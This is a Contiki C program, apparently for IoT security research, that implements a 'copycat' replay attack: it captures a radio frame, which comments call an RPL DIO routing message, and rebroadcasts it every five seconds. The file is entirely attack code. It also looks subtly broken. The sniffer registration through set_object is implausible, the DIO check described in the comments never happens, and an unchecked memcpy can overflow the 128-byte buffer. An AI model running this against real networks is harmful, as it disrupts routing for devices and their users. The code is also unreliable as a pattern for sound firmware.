#include "contiki.h"
#include "net/netstack.h"
#include "net/packetbuf.h"
#include "sys/log.h"

#define LOG_MODULE "COPYCAT"
#define LOG_LEVEL LOG_LEVEL_INFO

#define REPLAY_INTERVAL (5 * CLOCK_SECOND)

static uint8_t saved_frame[128];
static uint16_t saved_len = 0;

PROCESS(copycat_process, "Copycat attack");
AUTOSTART_PROCESSES(&copycat_process);

/*---------------------------------------------------------------------------*/
/* Radio sniffer: RAW frame listener */
static int
copycat_raw_sniffer(const void *data, unsigned short len)
{
  /* RPL DIO 식별 (6LoWPAN 압축된 형태에서도 상위 비트 특징 존재) */
  if(len > 10 && (saved_len == 0)) {
    /* 프레임 저장 */
    memcpy(saved_frame, data, len);
    saved_len = len;

    LOG_INFO("Captured a frame len=%u\n", len);
  }

  return 1;
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(copycat_process, ev, data)
{
  static struct etimer timer;

  PROCESS_BEGIN();

  LOG_INFO("Copycat attacker started\n");

  /* Radio sniffer 등록 */
  NETSTACK_RADIO.set_object(RADIO_PARAM_LAST_PACKET, (void*)copycat_raw_sniffer, sizeof(copycat_raw_sniffer));

  etimer_set(&timer, REPLAY_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));

    if(saved_len > 0) {
      LOG_WARN("Replaying captured frame len=%u\n", saved_len);

      NETSTACK_RADIO.send(saved_frame, saved_len);
    }

    etimer_reset(&timer);
  }

  PROCESS_END();
}